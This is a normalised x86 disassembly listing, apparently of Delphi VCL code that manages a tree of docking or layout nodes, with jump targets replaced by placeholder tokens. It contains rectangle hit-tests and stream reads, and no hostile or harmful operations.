mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43ba78
mov eax [ ebp - 0x4 ]
call sub_446174
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_446174
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_446174
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_446174
push ebx
mov ebx eax
mov eax ebx
call sub_445c54
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_445bd4
test al al
je r-xdata
mov eax ebx
call sub_445c8c
pop ebx
retn
sub_4461b0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_44619c
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_445c1c
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4461a0
mov esi eax
mov edx edi
mov eax esi
call sub_4461b0
sub_4461f0
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_446174
mov edi eax
mov eax ebx
call sub_445c8c
cmp edi eax
jl r-xdata
mov eax esi
call sub_445e58
mov edi [ esi + 0x1c ]
push edi
push sub_44802c
mov edx esi
mov eax edi
call sub_446530
mov eax ebx
call sub_446174
mov edi eax
mov eax esi
call sub_445cd4
cmp edi eax
jle r-xdata
mov eax ebx
call sub_4461f0
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_44625c
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_445c54
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_446284
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403f34
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x80000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_404288
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_445bf8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423d20
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42a790
mov edx eax
mov eax ebx
call sub_423e9c
mov eax [ ebp - 0x4 ]
call sub_446458
xor eax eax
push ebp
push sub_446391
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43ff78
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_445e58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446398
mov eax [ ebp - 0x4 ]
call sub_44645c
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_43ff3c
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_446398
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_44803c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4463ec
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_447680
mov eax [ esi + 0x10 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_446470
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_446470
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_446470
pop ecx
sub_4464c8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_446470
pop ecx
sub_4464f4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4464f4
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4464f4
pop ecx
sub_446548
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_4464c8
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_445da0
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_445da0
push eax
mov edx 0x1
mov eax ebx
call sub_445d1c
push eax
mov edx 0x2
mov eax ebx
call sub_445d1c
pop edx
pop ecx
call sub_415398
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_403728
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4465cc
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_445ff8
jmp r-xdata
movzx eax [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_415398
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43ba78
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_445bf8
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4464c8
mov [ ebp - 0x8 ] eax
movzx eax [ ebp - 0x1 ]
movzx eax [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_445c1c
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_44771c
mov edx esi
mov eax ebx
call sub_4464c8
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_43c0e8
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_445bf8
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
movzx eax [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
movzx eax [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43c0d4
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
movzx edx [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
movzx edx [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_445da0
mov edx eax
mov eax edi
call sub_44619c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_445da0
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_445da0
mov edx eax
mov eax edi
call sub_44619c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_445da0
mov [ ebx + 0x68 ] eax
jmp r-xdata
movzx edx [ ebp - 0x9 ]
push edx
movzx edx [ ebp - 0x1 ]
movzx edx [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4467e8
movzx edx [ ebp - 0x1 ]
movzx edx [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_446990
jmp r-xdata
sub_4467e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_445bf8
mov ebx eax
movzx eax [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_446174
mov edx eax
mov eax ebx
call sub_44619c
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_44619c
mov eax [ esi + 0x64 ]
call sub_446174
mov [ esi + 0x68 ] eax
movzx eax [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_447aa4
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_446530
mov eax [ esi + 0x64 ]
call sub_446174
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_447aa4
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_446530
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_447ef4
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_446530
mov eax [ esi + 0x64 ]
call sub_446174
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_44802c
xor edx edx
mov eax esi
call sub_446530
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_44619c
adc edx 0x0
mov eax ebx
call sub_445e58
mov eax ebx
call sub_4461f0
push esi
push sub_44802c
xor edx edx
mov eax esi
call sub_446530
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_446990
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_445e58
mov eax [ ebx + 0x14 ]
call sub_4461f0
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_446a08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov edx 0x1
mov eax esi
call sub_445d1c
mov edi eax
mov edx 0x2
mov eax esi
call sub_445d1c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jl r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
add edx [ ebp - 0xc ]
cmp eax edx
jg r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jl r-xdata
mov edx 0x1
mov eax esi
call sub_445da0
add edi eax
cmp edi [ ebx + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax esi
call sub_445da0
add eax [ ebp - 0xc ]
cmp eax [ ebx ]
jl r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ esi + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
cmp edx [ ebx ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x14
jmp r-xdata
sub_446b0c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov edi edx
mov ebp eax
mov eax [ ebp + 0x14 ]
call sub_43ff78
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x14 ]
mov edx esi
call sub_43ff3c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
mov ecx esp
call sub_415348
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1da ] 0x0
je r-xdata
mov eax ebx
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
sub_446b98
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_446174
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_446174
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_446174
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x40 ]
test al al
je r-xdata
mov eax ebx
call sub_446174
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_446250
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446278
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446250
call sub_446b98
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446278
call sub_446b98
pop ecx
sub_446cac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_446b0c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_446278
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0x94 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4464c8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_446278
call sub_446b98
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_446d34
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_404e44
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4055ac
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_446d7c
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4470bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0xc ]
call sub_447680
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x74 ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0xc ]
call sub_446458
xor eax eax
push ebp
push sub_44709a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x1c ] 0x40000
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x70 ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x74 ] 0x0
mov [ ebp - 0x26 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] 0x0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x0
lea eax [ ebp - 0x40 ]
push eax
push 0x1
lea edx [ ebp - 0x44 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x74 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x26 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x20 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
inc eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x0
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
movzx edx [ ebp - 0x26 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0xc ]
call sub_448770
mov edx [ ebp - 0xc ]
mov [ edx + 0x68 ] eax
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov si 0xffb7
call sub_404160
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4470a1
mov eax [ ebp - 0xc ]
movzx edx [ ebp - 0x25 ]
mov [ eax + 0x74 ] dl
mov eax [ ebp - 0xc ]
cmp [ eax + 0x64 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_445bf8
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
push ebp
lea eax [ ebp - 0x8 ]
call sub_446d34
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_43c068
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_43cf48
mov eax [ ebp - 0xc ]
call sub_44645c
retn
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_445bf8
mov edx [ ebp - 0xc ]
mov [ edx + 0x64 ] eax
push ebp
lea eax [ ebp - 0x8 ]
call sub_446d34
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx edx [ ebx + 0x10 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov edx [ ebx + 0x20 ]
mov eax [ ebp - 0xc ]
call sub_448770
mov [ ebx + 0x20 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_445f44
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403f64
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
cmp [ esi + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
